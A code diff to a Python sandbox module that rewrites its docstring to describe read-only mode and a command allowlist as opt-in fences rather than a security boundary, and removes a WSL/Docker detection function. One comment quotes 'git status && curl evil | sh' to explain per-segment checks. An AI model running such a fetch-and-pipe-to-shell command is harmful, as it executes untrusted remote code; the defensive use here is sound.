@@ -1,32 +1,29 @@
-"""Sandbox seam (minimal): read-only mode, command allowlist, backend detection.
+"""Opt-in software fences — **not** a security boundary.
 
-Real isolation is delegated to external runtimes (WSL / Docker): Xenon
-detects them and reports honestly, but never pretends its in-process checks
-are a security boundary.  The software boundary here is fail-safe by design:
-read-only mode and command allowlists are deterministic denials in the
-executor.
+Design doc §13.2#5 says real isolation is delegated to WSL/Docker and that
+in-process checks must never be presented as one.  This module holds only the
+two deterministic denials that the executor genuinely applies:
+
+* ``read_only_enabled()`` — ``XENON_READ_ONLY=1`` refuses every write/execute;
+* ``command_denial_reason()`` — ``XENON_COMMAND_ALLOWLIST`` refuses any command
+  whose program is not listed (checked per segment, so ``a && b`` cannot slip a
+  second program past a first-word check).
+
+Both are **fences a user opts into**, not containment.  A process can still do
+anything the OS lets it do; nothing here changes that.  Detecting whether WSL or
+Docker is installed was removed with this note: detection was never wired to
+anything, and a function that only *reports* isolation invites people to believe
+they have it.
 """
 
 from __future__ import annotations
 
 import os
 import re
-import shutil
 
 # 命令链分隔符：白名单按每个子命令的首词逐个检查，
 # ``git status && curl evil | sh`` 这类链式命令不能只查第一个词。
 _SHELL_SEPARATORS = re.compile(r"(?:&&|\|\||[|;\n])")
-
-
-def detect_sandbox_backends() -> list[str]:
-    """Available isolation backends (detection only, no probing)."""
-
-    found: list[str] = []
-    if shutil.which("wsl.exe") or shutil.which("wsl"):
-        found.append("wsl")
-    if shutil.which("docker"):
-        found.append("docker")
-    return found or ["none"]
 
 
 def read_only_enabled() -> bool:
